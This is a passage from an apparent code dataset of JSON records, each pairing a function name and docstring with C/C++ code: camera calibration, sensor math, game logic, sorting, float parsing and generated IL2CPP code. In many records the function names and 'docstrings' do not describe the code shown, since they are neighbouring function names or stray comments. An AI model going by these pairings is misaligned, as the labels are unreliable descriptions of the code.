20, 0.1)\u8fed\u4ee3\u7ec8\u6b62\u6761\u4ef6\\n\\t\\t\\t\\t*\/\\n\\t\\t\\t\\tcornerSubPix(grayImageL, cornerL, Size(5, 5), Size(-1, -1), TermCriteria(CV_TERMCRIT_EPS | CV_TERMCRIT_ITER, 20, 0.1));\\n\\t\\t\\t\\tdrawChessboardCorners(rgbImageL, boardSize, cornerL, isFindL);\\n\\t\\t\\t\\timshow(\"Chessboard L\", rgbImageL);\\n\\t\\t\\t\\timagePointL.push_back(cornerL);\\n\\n\\n\\t\\t\\t\\tcornerSubPix(grayImageR, cornerR, Size(5, 5), Size(-1, -1), TermCriteria(CV_TERMCRIT_EPS | CV_TERMCRIT_ITER, 20, 0.1));\\n\\t\\t\\t\\tdrawChessboardCorners(rgbImageR, boardSize, cornerR, isFindR);\\n\\t\\t\\t\\timshow(\"Chessboard R\", rgbImageR);\\n\\t\\t\\t\\timagePointR.push_back(cornerR);\\n\\n\\t\\t\\t\\tgoodFrameCount++;\\n\\n\\t\\t\\t\\tcout << \"\u7b2c \" << goodFrameCount << \"\/\" << frameNumber << \" \u5f20\u56fe\u7247\u5df2\u91c7\u96c6\" << endl;\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\tcout << (isFindL?\"\u53f3\":\"\u5de6\") << \"\u56fe\u65e0\u6cd5\u627e\u5230\u6240\u6709\u89d2\u70b9\uff0c\u8bf7\u91cd\u8bd5\uff01\" << endl;\\n\\t\\t\\t}\\n\\n\\t\\t}\\n\\n\\t}\\n\\n\\tdestroyAllWindows();\\n\\n\\t\/*\\n\\t\u8ba1\u7b97\u5b9e\u9645\u7684\u6821\u6b63\u70b9\u7684\u4e09\u7ef4\u5750\u6807\\n\\t\u6839\u636e\u5b9e\u9645\u6807\u5b9a\u683c\u5b50\u7684\u5927\u5c0f\u6765\u8bbe\u7f6e\\n\\t*\/\\n\\tcalRealPoint(objRealPoint, boardWidth, boardHeight, frameNumber, squareSize);\\n\\n\\t\/*\\n\\t\u6807\u5b9a\u6444\u50cf\u5934\\n\\t\u7531\u4e8e\u5de6\u53f3\u6444\u50cf\u673a\u5206\u522b\u90fd\u7ecf\u8fc7\u4e86\u5355\u76ee\u6807\u5b9a\\n\\t\u6240\u4ee5\u5728\u6b64\u5904\u9009\u62e9flag = CALIB_USE_INTRINSIC_GUESS\\n\\t*\/\\n\\tdouble rms = stereoCalibrate(objRealPoint, imagePointL, imagePointR,\\n\\t\\tcameraMatrixL, distCoeffL,\\n\\t\\tcameraMatrixR, distCoeffR,\\n\\t\\timageSize, R, T, E, F,\\n\\t\\tCALIB_USE_INTRINSIC_GUESS,\\n\\t\\tTermCriteria(TermCriteria::COUNT + TermCriteria::EPS, 100, 1e-5));\\n\\n\\tcout << \"RMS: \" << rms << endl;\\n\\n\\t\/*\\n\\t\u7acb\u4f53\u6821\u6b63\u7684\u65f6\u5019\u9700\u8981\u4e24\u5e45\u56fe\u50cf\u5171\u9762\u5e76\u4e14\u884c\u5bf9\u51c6 \u4ee5\u4f7f\u5f97\u7acb\u4f53\u5339\u914d\u66f4\u52a0\u7684\u53ef\u9760\\n\\t\u4f7f\u5f97\u4e24\u5e45\u56fe\u50cf\u5171\u9762\u7684\u65b9\u6cd5\u5c31\u662f\u628a\u4e24\u4e2a\u6444\u50cf\u5934\u7684\u56fe\u50cf\u6295\u5f71\u5230\u4e00\u4e2a\u516c\u5171\u6210\u50cf\u9762\u4e0a\uff0c\u8fd9\u6837\u6bcf\u5e45\u56fe\u50cf\u4ece\u672c\u56fe\u50cf\u5e73\u9762\u6295\u5f71\u5230\u516c\u5171\u56fe\u50cf\u5e73\u9762\u90fd\u9700\u8981\u4e00\u4e2a\u65cb\u8f6c\u77e9\u9635R\\n\\tstereoRectify \u8fd9\u4e2a\u51fd\u6570\u8ba1\u7b97\u7684\u5c31\u662f\u4ece\u56fe\u50cf\u5e73\u9762\u6295\u5f71\u90fd\u516c\u5171\u6210\u50cf\u5e73\u9762\u7684\u65cb\u8f6c\u77e9\u9635Rl,Rr\u3002 Rl,Rr\u5373\u4e3a\u5de6\u53f3\u76f8\u673a\u5e73\u9762\u884c\u5bf9\u51c6\u7684\u6821\u6b63\u65cb\u8f6c\u77e9\u9635\u3002\\n\\t\u5de6\u76f8\u673a\u7ecf\u8fc7Rl\u65cb\u8f6c\uff0c\u53f3\u76f8\u673a\u7ecf\u8fc7Rr\u65cb\u8f6c\u4e4b\u540e\uff0c\u4e24\u5e45\u56fe\u50cf\u5c31\u5df2\u7ecf\u5171\u9762\u5e76\u4e14\u884c\u5bf9\u51c6\u4e86\u3002\\n\\t\u5176\u4e2dPl,Pr\u4e3a\u4e24\u4e2a\u76f8\u673a\u7684\u6295\u5f71\u77e9\u9635\uff0c\u5176\u4f5c\u7528\u662f\u5c063D\u70b9\u7684\u5750\u6807\u8f6c\u6362\u5230\u56fe\u50cf\u76842D\u70b9\u7684\u5750\u6807:P*[X Y Z 1]\\' =[x y w]\\n\\tQ\u77e9\u9635\u4e3a\u91cd\u6295\u5f71\u77e9\u9635\uff0c\u5373\u77e9\u9635Q\u53ef\u4ee5\u628a2\u7ef4\u5e73\u9762(\u56fe\u50cf\u5e73\u9762)\u4e0a\u7684\u70b9\u6295\u5f71\u52303\u7ef4\u7a7a\u95f4\u7684\u70b9:Q*[x y d 1] = [X Y Z W]\u3002\u5176\u4e2dd\u4e3a\u5de6\u53f3\u4e24\u5e45\u56fe\u50cf\u7684\u65f6\u5dee\\n\\t*\/\\n\\tstereoRectify(cameraMatrixL, distCoeffL, cameraMatrixR, distCoeffR, imageSize, R, T, Rl, Rr, Pl, Pr, Q,\\n\\t\\tCALIB_ZERO_DISPARITY, 0, imageSize, &validROIL, &validROIR);\\n\\tcout << \"Tx:\" << -1 \/ Q.at<double>(3, 2) << endl;\\n\\n\\tmapLx = Mat(imageSize, CV_32FC1);\\n\\tmapLy = Mat(imageSize, CV_32FC1);\\n\\tmapRx = Mat(imageSize, CV_32FC1);\\n\\tmapRy = Mat(imageSize, CV_32FC1);\\n\\t\/*\\n\\t\u6839\u636estereoRectify \u8ba1\u7b97\u51fa\u6765\u7684R \u548c P \u6765\u8ba1\u7b97\u56fe\u50cf\u7684\u6620\u5c04\u8868 mapx,mapy\\n\\tmapx,mapy\u8fd9\u4e24\u4e2a\u6620\u5c04\u8868\u63a5\u4e0b\u6765\u53ef\u4ee5\u7ed9remap()\u51fd\u6570\u8c03\u7528\uff0c\u6765\u6821\u6b63\u56fe\u50cf\uff0c\u4f7f\u5f97\u4e24\u5e45\u56fe\u50cf\u5171\u9762\u5e76\u4e14\u884c\u5bf9\u51c6\\n\\tininUndistortRectifyMap()\u7684\u53c2\u6570newCameraMatrix\u5c31\u662f\u6821\u6b63\u540e\u7684\u6444\u50cf\u673a\u77e9\u9635\u3002\u5728openCV\u91cc\u9762\uff0c\u6821\u6b63\u540e\u7684\u8ba1\u7b97\u673a\u77e9\u9635Mrect\u662f\u8ddf\u6295\u5f71\u77e9\u9635P\u4e00\u8d77\u8fd4\u56de\u7684\u3002\\n\\t\u6240\u4ee5\u6211\u4eec\u5728\u8fd9\u91cc\u4f20\u5165\u6295\u5f71\u77e9\u9635P\uff0c\u6b64\u51fd\u6570\u53ef\u4ee5\u4ece\u6295\u5f71\u77e9\u9635P\u4e2d\u8bfb\u51fa\u6821\u6b63\u540e\u7684\u6444\u50cf\u673a\u77e9\u9635\\n\\t*\/\\n\\tinitUndistortRectifyMap(cameraMatrixL, distCoeffL, Rl, Pl, imageSize, CV_32FC1, mapLx, mapLy);\\n\\tinitUndistortRectifyMap(cameraMatrixR, distCoeffR, Rr, Pr, imageSize, CV_32FC1, mapRx, mapRy);\\n\\n\\t\/*\u4fdd\u5b58\u5e76\u8f93\u51fa\u6570\u636e*\/\\n\\toutputCameraParam();\\n\\t\\n\\tshowRectifyImage();\\n\\n\\treturn 0;\\n}'}","id":4931}
{"content":"{'function_name': 'ComputeTransformationMatrix', 'docstring': '\/\/\\r', 'code': 'VMResultArray<float> ApplyTransformationMatrix(\\r\\n         VMClassRegistry* registry, UInt32 stackId, StaticFunctionTag*,\\r\\n         VMArray<float> afPosition,\\r\\n         VMArray<float> afMatrix\\r\\n      ) {\\r\\n         VMResultArray<float> result;\\r\\n         result.resize(3);\\r\\n         if (afPosition.Length() < 3) {\\r\\n            registry->LogError(\"afPosition must have three or more elements (extras will be ignored).\", stackId);\\r\\n            return result;\\r\\n         };\\r\\n         if (afMatrix.Length() < 9) {\\r\\n            registry->LogError(\"afMatrix must have nine or more elements (extras will be ignored).\", stackId);\\r\\n            return result;\\r\\n         };\\r\\n         float position[3];\\r\\n         float matrix[9];\\r\\n         for (UInt8 i = 0; i < 3; i++)\\r\\n            afPosition.Get(&position[i], i);\\r\\n         for (UInt8 i = 0; i < 9; i++)\\r\\n            afMatrix.Get(&matrix[i], i);\\r\\n         \/\/\\r\\n         result[0] = (matrix[0] * position[0]) + (matrix[1] * position[1]) + (matrix[2] * position[2]);\\r\\n         result[1] = (matrix[3] * position[0]) + (matrix[4] * position[1]) + (matrix[5] * position[2]);\\r\\n         result[2] = (matrix[6] * position[0]) + (matrix[7] * position[1]) + (matrix[8] * position[2]);\\r\\n         \/* PAPYRUS:\\r\\n            _fEditingSnapPositionLocal[0] = _fEditingSnapTransformToLocal[0]*_fEditingSnapPosition[0] + _fEditingSnapTransformToLocal[1]*_fEditingSnapPosition[1] + _fEditingSnapTransformToLocal[2]*_fEditingSnapPosition[2]\\r\\n            _fEditingSnapPositionLocal[1] = _fEditingSnapTransformToLocal[3]*_fEditingSnapPosition[0] + _fEditingSnapTransformToLocal[4]*_fEditingSnapPosition[1] + _fEditingSnapTransformToLocal[5]*_fEditingSnapPosition[2]\\r\\n            _fEditingSnapPositionLocal[2] = _fEditingSnapTransformToLocal[6]*_fEditingSnapPosition[0] + _fEditingSnapTransformToLocal[7]*_fEditingSnapPosition[1] + _fEditingSnapTransformToLocal[8]*_fEditingSnapPosition[2]\\r\\n         *\/\\r\\n         return result;\\r\\n      }'}","id":4936}
{"content":"{'function_name': 'calculateScore', 'docstring': '\/\/ marker id squares', 'code': 'Transformation calculateTransformation(const Camera& camera,\\n    const std::vector<cv::Point2f>& points2D,\\n    const std::vector<cv::Point3f>& points3D) {\\n\\n    assert(points2D.size() == points3D.size());\\n\\n    cv::Mat cameraMatrix = getCameraMatrix(camera);\\n    cv::Mat distortionCoefficients = {};\\n\\n    cv::Mat transformationMatrix44{ 4, 4, CV_64FC1, 1.0 };\\n    cv::Mat rotationMatrix33, translationVec, rotationVec;\\n\\n    cv::solvePnP(points3D, points2D, cameraMatrix, distortionCoefficients, rotationVec, translationVec, false);\\n    cv::Rodrigues(rotationVec, rotationMatrix33);\\n\\n    \/\/ create a 4x4 transformation matrix\\n    rotationMatrix33.copyTo(transformationMatrix44({ 0, 0, 3, 3 }));\\n    translationVec.copyTo(transformationMatrix44({ 3, 0, 1, 3 }));\\n\\n    \/\/ convert from OpenCV camera space to OpenGL camera space\\n    \/\/ by rotating 180 degrees around OX\\n    auto openGLMatrix = rotateOx180(transformationMatrix44);\\n\\n    Translation t = getTranslation(openGLMatrix);\\n    Rotation r = getEulerAngles(openGLMatrix);\\n    \\n    \/\/ remove our OX rotation information\\n    r.ox = clampAngle(180.0 - r.ox);\\n    r.oy = clampAngle(r.oy);\\n    r.oz = clampAngle(r.oz);\\n\\n    return{ t, r };\\n}'}","id":4938}
{"content":"{'function_name': 'GPSStart', 'docstring': '\/\/to do add feed back with leds', 'code': 'long Pressure(unsigned long up) {\\n\\n\\n  b6 = b5 - 4000;\\n  \/\/ Calculate B3\\n  x1 = (b2 * (b6 * b6) >> 12) >> 11;\\n  x2 = (ac2 * b6) >> 11;\\n  x3 = x1 + x2;\\n  b3 = (((((long)ac1) * 4 + x3) << OSS) + 2) >> 2;\\n\\n  \/\/ Calculate B4\\n  x1 = (ac3 * b6) >> 13;\\n  x2 = (b1 * ((b6 * b6) >> 12)) >> 16;\\n  x3 = ((x1 + x2) + 2) >> 2;\\n  b4 = (ac4 * (unsigned long)(x3 + 32768)) >> 15;\\n\\n  b7 = ((unsigned long)(up - b3) * (50000 >> OSS));\\n  if (b7 < 0x80000000)\\n    p = (b7 << 1) \/ b4;\\n  else\\n    p = (b7 \/ b4) << 1;\\n\\n  x1 = (p >> 8) * (p >> 8);\\n  x1 = (x1 * 3038) >> 16;\\n  x2 = (-7357 * p) >> 16;\\n  p += (x1 + x2 + 3791) >> 4;\\n\\n  return p;\\n}'}","id":4946}
{"content":"{'function_name': 'try_to_move_piece', 'docstring': '\/\/ If we are engaged, then now show possible attacks.', 'code': 'void move_piece(int x, int y)\\n{\\n\\tint total;\\n\\tchar name[512];\\n\\n\\t\/\/ Can we attack this new piece?\\n\\tif (highlight_board[x][y].type == HIGHLIGHT_CAN_ATTACK)\\n\\t{\\n\\t\\tif (!board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_attacked)\\n\\t\\t{\\n\\t\\t\\tattack_piece(x, y);\\n\\n\\t\\t\\t\/\/ Can our selected piece also shoot?\\n\\t\\t\\tif (!board[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_shot)\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/ Yes, so highlight enemy pieces that can be shot..\\n\\t\\t\\t\\ttotal = set_highlight_board(board_info.selected_x, board_info.selected_y, \\n\\t\\t\\t\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].ranged_combat_range, PIECE, \\n\\t\\t\\t\\t\\tfalse, false, true, true, true, \"\");\\n\\n\\t\\t\\t\\tif (total == 0)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tclear_highlight_board();\\n\\t\\t\\t\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].has_shot = true;\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tshoot_piece(x, y);\\n\\t\\t}\\n\\t\\treturn;\\n\\t}\\n\\n\\t\/\/ Can we \\'mount\\' this piece?\\n\\tif (highlight_board[x][y].type == HIGHLIGHT_CAN_RIDE)\\n\\t{\\n\\t\\tride_piece(x, y);\\n\\t\\treturn;\\n\\t}\\n\\n\\t\/\/ Must be able to move to this new position on the board then..\\n\\tif (game.debug_to_chat)\\n\\t{\\n\\t\\tsprintf(name, \"%s moved from %d, %d to %d, %d\", board[board_info.selected_x][board_info.selected_y][PIECE].name, \\n\\t\\t\\tboard_info.selected_x, board_info.selected_y, x, y);\\n\\t\\tadd_chat_line(name, wizard[game.current_wizard].col);\\n\\t}\\n\\n\\t\/\/ Move piece data.\\n\\tboard[x][y][PIECE] =\\n\\t\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer];\\n\\n\\tif (board_info.selected_layer == PIECE)\\n\\t{\\n\\t\\t\/\/ Move any riders too..\\n\\t\\tboard[x][y][MOUNTED] =\\n\\t\\t\\tboard[board_info.selected_x][board_info.selected_y][MOUNTED];\\n\\n\\t\\t\/\/ Turn old riding piece data to BLANK\\n\\t\\tboard[board_info.selected_x][board_info.selected_y][MOUNTED].gfx = BLANK;\\n\\n\\t\\tboard[x][y][MOUNTED].has_moved = true;\\n\\t\\tboard[x][y][MOUNTED].has_attacked = true;\\n\\t\\tboard[x][y][MOUNTED].has_shot = true;\\n\\t}\\n\\n\\t\/\/ Turn old piece data to BLANK\\n\\tboard[board_info.selected_x][board_info.selected_y][board_info.selected_layer].gfx = BLANK;\\n\\n\\t\/\/ Are we moving our wizard? If so, keep track of new postion.\\n\\tif (wizard[game.current_wizard].x == board_info.selected_x && wizard[game.current_wizard].y == board_info.selected_y)\\n\\t{\\n\\t\\twizard[game.current_wizard].x = x;\\n\\t\\twizard[game.current_wizard].y = y;  \\n\\t}\\n\\n\\t\/\/ Update selected x and y.\\n\\tboard_info.selected_x = x;\\n\\tboard_info.selected_y = y;\\n\\tboard_info.selected_layer = PIECE; \/\/ Now back on ground if we were riding..\\n\\n\\trequest_sound_effect(board[x][y][PIECE].name, \"CREATURE\", \"MOVES\", false);\\n}'}","id":4947}
{"content":"{'function_name': 'countingsort', 'docstring': '\/\/printing the sorteda[]\\r', 'code': 'int main() {\\r\\n\\r\\n    long long int n;cin>>n;\\r\\n    for(int i=0;i<n;i++){\\r\\n        cin>>a[i];\\r\\n    }\\r\\n    countingsort(a,n);\\r\\n   \/\/ for(int i=0; i<n; i++){\\r\\n     \/\/   cout<<a[i]<<\" , \";\\r\\n  \/\/  }\\r\\n    return 0;\\r\\n}'}","id":4950}
{"content":"{'function_name': 'core__multiple_value_prog1_function', 'docstring': '\/\/ eval::funcall(func2);', 'code': 'CL_DEFUN T_mv core__progv_function(List_sp symbols, List_sp values, Function_sp func) {\\n  DynamicScopeManager manager;\\n  for (auto curSym : symbols) {\\n    Symbol_sp symbol = gc::As<Symbol_sp>(oCar(curSym));\\n    T_sp value = oCar(values);\\n    manager.pushSpecialVariableAndSet(symbol, value);\\n    values = oCdr(values);\\n  }\\n  T_mv result = (func->entry.load())(LCC_PASS_ARGS0_ELLIPSIS(func.raw_()));\\n  \/\/ T_mv result = eval::funcall(func);\\n  return result;\\n}'}","id":4953}
{"content":"{'function_name': 'depth_util', 'docstring': '\/\/ Node is valid, continue on to next leaf, so increase depth', 'code': 'bool isBalanced(const BinaryTreeNode* treeRoot) {\\n    \/\/ determine if the tree is superbalanced\\n    if (!treeRoot || (!treeRoot->left_ && !treeRoot->right_) ) return true;\\n    DepthTracker d;\\n    DepthTracker r = depth_util(treeRoot,d);\\n    cout << \"DEPTH: \" << r.max_depth  << \" \"  <<  r.min_depth << endl;\\n    return (!(r.max_depth - r.min_depth > 1));\\n}'}","id":4959}
{"content":"{'function_name': 'FindCenterDesktopH', 'docstring': '\/\/ \u0417\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u043c \u0443\u0433\u043b\u044b \u0440\u0430\u0431\u043e\u0447\u0435\u0433\u043e \u0441\u0442\u043e\u043b\u0430 \u0432 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e', 'code': 'int FindCenterDesktopV(void)\\n{\\n\\t\/\/ \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0445\u044d\u043d\u0434\u043b \u0440\u0430\u0431\u043e\u0447\u0435\u0433\u043e \u0441\u0442\u043e\u043b\u0430\\n\\tHWND hDesktop = GetDesktopWindow();\\n\\n\\t\/\/ \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0443\u0433\u043b\u043e\u0432 \u0440\u0430\u0431\u043e\u0447\u0435\u0433\u043e \u0441\u0442\u043e\u043b\u0430\\n\\tRECT rectDesktop;\\n\\n\\t\/\/ \u0417\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u043c \u0443\u0433\u043b\u044b \u0440\u0430\u0431\u043e\u0447\u0435\u0433\u043e \u0441\u0442\u043e\u043b\u0430 \u0432 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e\\n\\tGetWindowRect(hDesktop, &rectDesktop);\\n\\n\\treturn (rectDesktop.bottom - rectDesktop.top) \/ 2;\\n}'}","id":4960}
{"content":"{'function_name': 'appd_iot_json_add_string_key_value', 'docstring': '\/\/do escape, get the size', 'code': 'static appd_iot_error_code_t appd_iot_json_add_value\\n(json_t* json, const void* value, appd_iot_data_types_t type)\\n{\\n  if ((json == NULL) || (value == NULL))\\n  {\\n    return APPD_IOT_ERR_NULL_PTR;\\n  }\\n\\n  char* strval;\\n  size_t value_size = 256; \/\/default size for integer, double and boolean types\\n\\n  \/\/for string, set size to twice the original length to accomodate any escape characters.\\n  if (type == APPD_IOT_STRING)\\n  {\\n    value_size = 2 * strlen((char*)value);\\n  }\\n\\n  strval = (char*)calloc(1, value_size);\\n\\n  if (strval == NULL)\\n  {\\n    appd_iot_log(APPD_IOT_LOG_ERROR, \"Failed to allocate memory while adding key-value to json\");\\n    return APPD_IOT_ERR_NULL_PTR;\\n  }\\n\\n  appd_iot_error_code_t retcode  = appd_iot_convert_to_string(strval, value_size, value, type);\\n\\n  if (retcode != APPD_IOT_SUCCESS)\\n  {\\n    free(strval);\\n    return retcode;\\n  }\\n\\n  size_t len = strlen(strval);\\n\\n  \/\/add space for extra characters doublequote(\")\\n  if (type == APPD_IOT_STRING)\\n  {\\n    len = len + 2; \/\/2 doublequotes \"value\"\\n  }\\n\\n  char eol[2];\\n  eol[0] = \\'\\\\0\\';\\n\\n  \/\/add comma at the end if last operation is not start\\n  if (json->last_op != START_OBJECT && json->last_op != START_ARRAY && json->last_op != INIT)\\n  {\\n    len = len + 1;\\n    eol[0] = \\',\\';\\n    eol[1] = \\'\\\\0\\';\\n  }\\n\\n  retcode = appd_iot_check_and_expand_json_buf_size(json, len);\\n\\n  if (retcode != APPD_IOT_SUCCESS)\\n  {\\n    free(strval);\\n    return retcode;\\n  }\\n\\n  switch (type)\\n  {\\n    case APPD_IOT_STRING:\\n      \/\/snprintf copies string of len into buffer\\n      snprintf(json->buf + json->len, len + 1, \"%s\\\\\"%s\\\\\"\", eol, strval);\\n      break;\\n\\n    case APPD_IOT_INTEGER:\\n    case APPD_IOT_DOUBLE:\\n    case APPD_IOT_BOOLEAN:\\n      snprintf(json->buf + json->len, len + 1, \"%s%s\", eol, strval);\\n      break;\\n\\n    default:\\n      appd_iot_log(APPD_IOT_LOG_WARN, \"Invalid Data Type\");\\n      free(strval);\\n      return APPD_IOT_ERR_INVALID_INPUT;\\n\\n  }\\n\\n  json->len = json->len + len;\\n  json->buf[json->len] = \\'\\\\0\\';\\n  json->last_op = ADD_DATA;\\n\\n  free(strval);\\n\\n  return retcode;\\n}'}","id":4961}
{"content":"{'function_name': 'denoiseb_rd7_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd8_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd8 read pattern: { denoiseb_update_0[d0, d1] -> raw[-1 + 2d0, 1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 967 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_967();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4962}
{"content":"{'function_name': 'parse_infnan', 'docstring': '\/\/ be optimistic', 'code': 'from_chars_result from_chars_advanced(const char *first, const char *last,\\n                                      T &value, parse_options options)  noexcept  {\\n\\n  static_assert (std::is_same<T, double>::value || std::is_same<T, float>::value, \"only float and double are supported\");\\n\\n\\n  from_chars_result answer;\\n  if (first == last) {\\n    answer.ec = std::errc::invalid_argument;\\n    answer.ptr = first;\\n    return answer;\\n  }\\n  parsed_number_string pns = parse_number_string(first, last, options);\\n  if (!pns.valid) {\\n    return detail::parse_infnan(first, last, value);\\n  }\\n  answer.ec = std::errc(); \/\/ be optimistic\\n  answer.ptr = pns.lastmatch;\\n  \/\/ Next is Clinger\\'s fast path.\\n  if (binary_format<T>::min_exponent_fast_path() <= pns.exponent && pns.exponent <= binary_format<T>::max_exponent_fast_path() && pns.mantissa <=binary_format<T>::max_mantissa_fast_path() && !pns.too_many_digits) {\\n    value = T(pns.mantissa);\\n    if (pns.exponent < 0) { value = value \/ binary_format<T>::exact_power_of_ten(-pns.exponent); }\\n    else { value = value * binary_format<T>::exact_power_of_ten(pns.exponent); }\\n    if (pns.negative) { value = -value; }\\n    return answer;\\n  }\\n  adjusted_mantissa am = compute_float<binary_format<T>>(pns.exponent, pns.mantissa);\\n  if(pns.too_many_digits && am.power2 >= 0) {\\n    if(am != compute_float<binary_format<T>>(pns.exponent, pns.mantissa + 1)) {\\n      am = compute_error<binary_format<T>>(pns.exponent, pns.mantissa);\\n    }\\n  }\\n  \/\/ If we called compute_float<binary_format<T>>(pns.exponent, pns.mantissa) and we have an invalid power (am.power2 < 0),\\n  \/\/ then we need to go the long way around again. This is very uncommon.\\n  if(am.power2 < 0) { am = digit_comp<T>(pns, am); }\\n  to_float(pns.negative, am, value);\\n  return answer;\\n}'}","id":4965}
{"content":"{'function_name': 'con', 'docstring': '\/*int maxl2 = 0;\\n    string tmp2;\\n    for(int i = 0; i < len2; i++){\\n       int j;\\n       for(j = 0; j < len1 && i+j < len2; j++){\\n          if(str2[j+i] != str1[j]) break;\\n       }\\n       if(j+i == len2) {maxl2 = max(maxl2, j); break;}\\n    }\\n    tmp2 = str2+str1.substr(maxl2);\\n    maxl2 = len1 + len2 - maxl2;\\n    if(maxl1 < maxl2) return tmp1;\\n    else if(maxl1 > maxl2) return tmp2;\\n    else{\\n      if(tmp1 > tmp2) return tmp2;\\n      else return tmp1;\\n    }*\/', 'code': 'int main(){\\n  int n;\\n  cin >> n;\\n  for(int i = 0; i < n; i++) cin >> str[i];\\n  for(int i = 0; i < 1<<n; i++) dp[i] = \"\";\\n  for(int i = 0; i < (1<<n); i++){\\n    for(int j = 0; j < n; j++){\\n      \/\/if(i == 0) {dp[i|(1<<j)] = str[j];continue;}\\n      if(!(i&(1<<j))){\\n          int len1 = dp[i|(1<<j)].length();\\n          \/\/cout << i << \" \";\\n          string tmp = con(dp[i], str[j]);\\n          if(len1 == 0) dp[i|(1<<j)] = tmp;\\n          else{\\n              int len2 = tmp.length();\\n              if((len2 < len1) || (len2 == len1 && dp[i|(1<<j)] > tmp)) dp[i|(1<<j)] = tmp;\\n          }\\n      }\\n    }\\n  }\\n  \/\/for(int i = 0; i < (1<<n); i++) cout << dp[i] << endl;\\n  cout << dp[(1<<n)-1] << endl;\\n  return 0;\\n}'}","id":4968}
{"content":"{'function_name': 'Dictionary_2_System_Collections_ICollection_CopyTo_m752FF29BDA4DAEEB035C2F6D73F301EF6D181D29_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'IL2CPP_METHOD_ATTR void Dictionary_2_System_Collections_IDictionary_set_Item_m175E9D1A7B42C16047A707CDFE1BED2430E3342E_gshared (Dictionary_2_t798422731283F23B411096D7DB14B0E93F33BEDC * __this, RuntimeObject * ___key0, RuntimeObject * ___value1, const RuntimeMethod* method)\\n{\\n\\tstatic bool s_Il2CppMethodInitialized;\\n\\tif (!s_Il2CppMethodInitialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_System_Collections_IDictionary_set_Item_m175E9D1A7B42C16047A707CDFE1BED2430E3342E_MetadataUsageId);\\n\\t\\ts_Il2CppMethodInitialized = true;\\n\\t}\\n\\tbool V_0 = false;\\n\\tint32_t V_1 = 0;\\n\\tException_t * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = -1;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tRuntimeObject * L_0 = ___key0;\\n\\t\\tif (L_0)\\n\\t\\t{\\n\\t\\t\\tgoto IL_000e;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_1 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_1, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_1, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m175E9D1A7B42C16047A707CDFE1BED2430E3342E_RuntimeMethod_var);\\n\\t}\\n\\nIL_000e:\\n\\t{\\n\\t\\tRuntimeObject * L_2 = ___value1;\\n\\t\\tif (L_2)\\n\\t\\t{\\n\\t\\t\\tgoto IL_002c;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\til2cpp_codegen_initobj((&V_0), sizeof(bool));\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_4 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_4, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden 